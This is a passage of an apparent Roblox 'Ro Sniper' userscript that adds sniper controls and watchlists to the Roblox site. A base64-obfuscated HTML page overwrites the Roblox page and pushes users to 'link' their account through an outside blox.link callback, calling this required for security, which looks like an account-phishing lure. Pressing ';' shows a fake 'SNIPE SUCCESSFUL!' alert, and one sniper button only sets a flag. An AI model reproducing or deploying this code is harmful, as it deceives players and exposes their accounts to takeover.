AgICAgICAgICAgY29sb3I6ICMwMGQ0ZmY7CiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDI0cHg7CiAgICAgICAgfQogICAgICAgIC5saW5rLWRlc2NyaXB0aW9uIHsKICAgICAgICAgICAgZm9udC1zaXplOiAxNnB4OwogICAgICAgICAgICBsaW5lLWhlaWdodDogMS42OwogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAzMnB4OwogICAgICAgICAgICBjb2xvcjogI2NiZDVlMTsKICAgICAgICB9CiAgICAgICAgLmxpbmstYnV0dG9uIHsKICAgICAgICAgICAgcGFkZGluZzogMTZweCAzMnB4OwogICAgICAgICAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCAjMDBkNGZmLCAjNjM2NmYxKTsKICAgICAgICAgICAgY29sb3I6IHdoaXRlOwogICAgICAgICAgICBib3JkZXI6IG5vbmU7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDEycHg7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTZweDsKICAgICAgICAgICAgZm9udC13ZWlnaHQ6IDYwMDsKICAgICAgICAgICAgY3Vyc29yOiBwb2ludGVyOwogICAgICAgICAgICB0cmFuc2l0aW9uOiBhbGwgMC4zczsKICAgICAgICB9CiAgICAgICAgLmxpbmstYnV0dG9uOmhvdmVyIHsKICAgICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC0ycHgpOwogICAgICAgICAgICBib3gtc2hhZG93OiAwIDEycHggMzVweCByZ2JhKDAsIDIxMiwgMjU1LCAwLjQpOwogICAgICAgIH0KICAgIDwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJsaW5rLWNvbnRhaW5lciI+CiAgICAgICAgPGgxIGNsYXNzPSJsaW5rLXRpdGxlIj5MaW5rIFlvdXIgUm9ibG94IEFjY291bnQ8L2gxPgogICAgICAgIDxwIGNsYXNzPSJsaW5rLWRlc2NyaXB0aW9uIj4KICAgICAgICAgICAgVG8gdXNlIFJvIFNuaXBlciBlbmhhbmNlZCBmZWF0dXJlcywgcGxlYXNlIGxpbmsgeW91ciBSb2Jsb3ggYWNjb3VudC4gCiAgICAgICAgICAgIFRoaXMgaXMgcmVxdWlyZWQgZm9yIHNlY3VyaXR5IGFuZCBmdW5jdGlvbmFsaXR5IHB1cnBvc2VzLgogICAgICAgIDwvcD4KICAgICAgICA8YnV0dG9uIGNsYXNzPSJsaW5rLWJ1dHRvbiIgb25jbGljaz0id2luZG93LmxvY2F0aW9uLmhyZWY9J2h0dHBzOi8vYmxveC5saW5rL2NhbGxiYWNrL3JvYmxveCc7Ij4KICAgICAgICAgICAgQ29udGludWUgd2l0aCBSb2Jsb3gKICAgICAgICA8L2J1dHRvbj4KICAgIDwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4=";

                const decodedHTML = atob(encodedHTML);
                document.open();
                document.write(decodedHTML);
                document.close();
            });
        }

        if (unlinkBtn) {
            unlinkBtn.addEventListener('click', () => {
                localStorage.setItem('accountLinked', 'false');
                location.reload(); // Reload to update UI
            });
        }
    }

    /* ---------------------- Saving & Loading Settings/Lists ---------------------- */
    function loadSavedListsAndSettings() {
        // Load limited settings
        const maxPurchase = localStorage.getItem('limited-max-purchase') || '0';
        const limitedInput = document.getElementById('limited-max-purchase-input');
        if (limitedInput) limitedInput.value = maxPurchase;

        // Load rolimon settings
        const minOP = localStorage.getItem('rolimon-min-op') || '0';
        const rolimonInput = document.getElementById('rolimon-min-op-input');
        if (rolimonInput) rolimonInput.value = minOP;

        const includeRobux = localStorage.getItem('rolimon-include-robux') === 'true';
        const includeRobuxCheckbox = document.getElementById('rolimon-include-robux-checkbox');
        if (includeRobuxCheckbox) includeRobuxCheckbox.checked = includeRobux;

        // Load deals settings
        const dealsPercentage = localStorage.getItem('dealsPercentage') || '70';
        const percentageRange = document.getElementById('deals-percentage-input');
        const percentageValue = document.getElementById('deals-percentage-value');
        if (percentageRange && percentageValue) {
            percentageRange.value = dealsPercentage;
            percentageValue.textContent = dealsPercentage + '%';
        }

        const dealsSettings = [
            ['deals-min-value-input', 'deals-min-value', '1000'],
            ['deals-min-rap-input', 'deals-min-rap', '1000'],
            ['deals-min-purchase-input', 'deals-min-purchase', '100'],
            ['deals-max-purchase-input', 'deals-max-purchase', '10000']
        ];

        dealsSettings.forEach(([inputId, storageKey, defaultValue]) => {
            const input = document.getElementById(inputId);
            if (input) {
                input.value = localStorage.getItem(storageKey) || defaultValue;
            }
        });

        const calculationSelect = document.getElementById('deals-calculation-select');
        if (calculationSelect) {
            calculationSelect.value = localStorage.getItem('deals-calculation') || 'rap';
        }

        const ignoreProjection = localStorage.getItem('deals-ignore-projection') === 'true';
        const ignoreProjectionCheckbox = document.getElementById('deals-ignore-projection-checkbox');
        if (ignoreProjectionCheckbox) ignoreProjectionCheckbox.checked = ignoreProjection;

        // Load watchlists
        loadLimitedIDs();
        loadRolimonIDs();
    }

    /* ---------------------- Watchlist Handling ---------------------- */
    function addLimitedID(id) {
        let ids = JSON.parse(localStorage.getItem('limitedSniperIDs') || '[]');
        if (!ids.includes(id)) {
            ids.push(id);
            localStorage.setItem('limitedSniperIDs', JSON.stringify(ids));
        }
    }

    function removeLimitedID(id) {
        let ids = JSON.parse(localStorage.getItem('limitedSniperIDs') || '[]');
        const index = ids.indexOf(id);
        if (index !== -1) {
            ids.splice(index, 1);
            localStorage.setItem('limitedSniperIDs', JSON.stringify(ids));
        }
    }

    function loadLimitedIDs() {
        const container = document.getElementById('limited-watchlist');
        if (!container) return;

        container.innerHTML = '';
        let ids = JSON.parse(localStorage.getItem('limitedSniperIDs') || '[]');

        if (ids.length === 0) {
            container.innerHTML = '<em style="color: #64748b;">No items added.</em>';
        } else {
            ids.forEach(id => {
                const div = document.createElement('div');
                div.className = 'watchlist-item';
                div.innerHTML = `
                    <span>Item ID: ${id}</span>
                    <span class="watchlist-remove" data-id="${id}">✕</span>
                `;

                div.querySelector('.watchlist-remove').addEventListener('click', (e) => {
                    removeLimitedID(e.target.dataset.id);
                    loadLimitedIDs();
                });

                container.appendChild(div);
            });
        }
    }

    function addRolimonID(id) {
        let ids = JSON.parse(localStorage.getItem('rolimonSniperIDs') || '[]');
        if (!ids.includes(id)) {
            ids.push(id);
            localStorage.setItem('rolimonSniperIDs', JSON.stringify(ids));
        }
    }

    function removeRolimonID(id) {
        let ids = JSON.parse(localStorage.getItem('rolimonSniperIDs') || '[]');
        const index = ids.indexOf(id);
        if (index !== -1) {
            ids.splice(index, 1);
            localStorage.setItem('rolimonSniperIDs', JSON.stringify(ids));
        }
    }

    function loadRolimonIDs() {
        const container = document.getElementById('rolimon-watchlist');
        if (!container) return;

        container.innerHTML = '';
        let ids = JSON.parse(localStorage.getItem('rolimonSniperIDs') || '[]');

        if (ids.length === 0) {
            container.innerHTML = '<em style="color: #64748b;">No items added.</em>';
        } else {
            ids.forEach(id => {
                const div = document.createElement('div');
                div.className = 'watchlist-item';
                div.innerHTML = `
                    <span>Item ID: ${id}</span>
                    <span class="watchlist-remove" data-id="${id}">✕</span>
                `;

                div.querySelector('.watchlist-remove').addEventListener('click', (e) => {
                    removeRolimonID(e.target.dataset.id);
                    loadRolimonIDs();
                });

                container.appendChild(div);
            });
        }
    }

    /* ---------------------- Control Section & Running State ---------------------- */
    function updateControlSections() {
        updateLimitedControlSection();
        updateRolimonControlSection();
        updateDealsControlSection();
    }

    function updateLimitedControlSection() {
        const section = document.getElementById('limited-control-section');
        if (!section) return;

        if (!accountLinked) {
            section.innerHTML = `<div class="sniper-alert warning">⚠️ Link your account to start Limited Sniper</div>`;
            return;
        }

        const running = localStorage.getItem('limitedSniperRunning') === 'true';

        if (running) {
            section.innerHTML = `
                <div class="sniper-alert success">
                    <span class="status-indicator running"></span>Limited Sniper is running!
                </div>
                <button class="sniper-button sniper-button-danger" id="limited-stop-btn">Stop Sniping</button>
            `;
            document.getElementById('limited-stop-btn').addEventListener('click', stopLimitedSniper);
        } else {
            section.innerHTML = `<button class="sniper-button" id="limited-start-btn">Start Limited Sniper</button>`;
            document.getElementById('limited-start-btn').addEventListener('click', startLimitedSniper);
        }
    }

    function updateRolimonControlSection() {
        const section = document.getElementById('rolimon-control-section');
        if (!section) return;

        if (!accountLinked) {
            section.innerHTML = `<div class="sniper-alert warning">⚠️ Link your account to start Rolimons Trade Sniper</div>`;
            return;
        }

        const running = localStorage.getItem('rolimonSniperRunning') === 'true';

        if (running) {
            section.innerHTML = `
                <div class="sniper-alert success">
                    <span class="status-indicator running"></span>Rolimons Trade Sniper is running!
                </div>
                <button class="sniper-button sniper-button-danger" id="rolimon-stop-btn">Stop Sniping</button>
            `;
            document.getElementById('rolimon-stop-btn').addEventListener('click', stopRolimonSniper);
        } else {
            section.innerHTML = `<button class="sniper-button" id="rolimon-start-btn">Start Rolimons Trade Sniper</button>`;
            document.getElementById('rolimon-start-btn').addEventListener('click', startRolimonSniper);
        }
    }

    function updateDealsControlSection() {
        const section = document.getElementById('deals-control-section');
        if (!section) return;

        if (!accountLinked) {
            section.innerHTML = `<div class="sniper-alert warning">⚠️ Link your account to start Deal Sniper</div>`;
            return;
        }

        const running = localStorage.getItem('dealsSniperRunning') === 'true';

        if (running) {
            section.innerHTML = `
                <div class="sniper-alert success">
                    <span class="status-indicator running"></span>Deal Sniper is running!
                </div>
                <button class="sniper-button sniper-button-danger" id="deals-stop-btn">Stop Deal Sniper</button>
            `;
            document.getElementById('deals-stop-btn').addEventListener('click', stopDealsSniper);
        } else {
            section.innerHTML = `<button class="sniper-button" id="deals-start-btn">Start Deal Sniper</button>`;
            document.getElementById('deals-start-btn').addEventListener('click', startDealsSniper);
        }
    }

    /* ---------------------- Custom Alert System ---------------------- */
    function showCustomAlert(title, message, icon = '⚠️') {
        // Remove existing alert if any
        const existingAlert = document.getElementById('custom-alert-overlay');
        if (existingAlert) {
            existingAlert.remove();
        }

        // Create alert overlay
        const alertOverlay = document.createElement('div');
        alertOverlay.className = 'custom-alert-overlay';
        alertOverlay.id = 'custom-alert-overlay';

        // Create alert box
        const alertBox = document.createElement('div');
        alertBox.className = 'custom-alert-box';
        alertBox.innerHTML = `
            <div class="custom-alert-close">×</div>
            <div class="custom-alert-icon">${icon}</div>
            <div class="custom-alert-title">${title}</div>
            <div class="custom-alert-message">${message}</div>
            <button class="sniper-button" onclick="document.getElementById('custom-alert-overlay').remove()">
                Understood
            </button>
        `;

        // Add close functionality
        const closeBtn = alertBox.querySelector('.custom-alert-close');
        closeBtn.addEventListener('click', () => {
            alertOverlay.remove();
        });

        // Close on overlay click
        alertOverlay.addEventListener('click', (e) => {
            if (e.target === alertOverlay) {
                alertOverlay.remove();
            }
        });

        // Close on ESC key
        const escapeHandler = (e) => {
            if (e.key === 'Escape') {
                alertOverlay.remove();
                document.removeEventListener('keydown', escapeHandler);
            }
        };
        document.addEventListener('keydown', escapeHandler);

        alertOverlay.appendChild(alertBox);
        document.body.appendChild(alertOverlay);

        // Show alert
        setTimeout(() => {
            alertOverlay.style.display = 'flex';
        }, 10);
    }

    // Sniper control functions
    function startLimitedSniper() {
        if (!accountLinked) {
            showCustomAlert(
                'Account Not Linked',
                'You must link your Roblox account before you can start the Limited Sniper. Please go to the "Link Account" tab to connect your account.',
                '🔗'
            );
            return;
        }
        localStorage.setItem('limitedSniperRunning', 'true');
        startlimitedsniper();
        updateLimitedControlSection();
        console.log('Limited Sniper started.');
    }

    function stopLimitedSniper() {
        localStorage.setItem('limitedSniperRunning', 'false');
        updateLimitedControlSection();
        console.log('Limited Sniper stopped.');
    }

    function startRolimonSniper() {
        if (!accountLinked) {
            showCustomAlert(
                'Account Not Linked',
                'You must link your Roblox account before you can start the Rolimons Trade Sniper. Please go to the "Link Account" tab to connect your account.',
                '🔗'
            );
            return;
        }
        localStorage.setItem('rolimonSniperRunning', 'true');
        updateRolimonControlSection();
        console.log('Rolimons Trade Sniper started.');
    }

    function stopRolimonSniper() {
        localStorage.setItem('rolimonSniperRunning', 'false');
        updateRolimonControlSection();
        console.log('Rolimons Trade Sniper stopped.');
    }

    function startDealsSniper() {
        if (!accountLinked) {
            showCustomAlert(
                'Account Not Linked',
                'You must link your Roblox account before you can start the Deal Sniper. Please go to the "Link Account" tab to connect your account.',
                '🔗'
            );
            return;
        }
        localStorage.setItem('dealsSniperRunning', 'true');
        updateDealsControlSection();
        startrolisniper();
        console.log('Deal Sniper started.');
    }

    function stopDealsSniper() {
        localStorage.setItem('dealsSniperRunning', 'false');
        updateDealsControlSection();
        console.log('Deal Sniper stopped.');
    }

    /* ---------------------- Sniped Alert on ; Key ---------------------- */
    function createSnipedAlert() {
        // Remove existing notification if any
        const existingNotif = document.getElementById('snipe-notification');
        if (existingNotif) {
            existingNotif.remove();
        }

        const alertEl = document.createElement('div');
        alertEl.id = 'snipe-notification';
        alertEl.className = 'sniper-alert success floating';
        alertEl.innerHTML = `
            <div style="display: flex; align-items: center; justify-content: space-between; width: 100%;">
                <div style="display: flex; align-items: center;">
                    <span style="font-size: 20px; margin-right: 12px;">🎯</span>
                    <div>
                        <div style="font-weight: 700; font-size: 14px;">SNIPE SUCCESSFUL!</div>
                        <div style="font-size: 12px; opacity: 0.8;">A limited has been sniped!</div>
                    </div>
                </div>
                <span style="cursor: pointer; font-size: 18px; opacity: 0.7; margin-left: 12px;" onclick="this.parentElement.parentElement.remove()">×</span>
            </div>
        `;

        document.body.appendChild(alertEl);

        setTimeout(() => {
            alertEl.classList.add('show');
        }, 100);

        setTimeout(() => {
            alertEl.classList.remove('show');
            setTimeout(() => {
                if (document.body.contains(alertEl)) {
                    alertEl.remove();
                }
            }, 500);
        }, 4000);
    }

    document.addEventListener('keydown', (e) => {
        if (e.key === ';') {
            createSnipedAlert();
        }
    });

    /* ---------------------- Initialize Script ---------------------- */
    function initScript() {
        waitForNavbar();
        setTimeout(() => {
            if (!document.getElementById('navbar-sniper')) {
                const alt = findNavbarAlternative();
                if (alt) {
                    loadButtonImage().then(() => {
                        initSniperButton(alt);
                    });
                }
            }
        }, 3000);
    }

    initScript();
})();
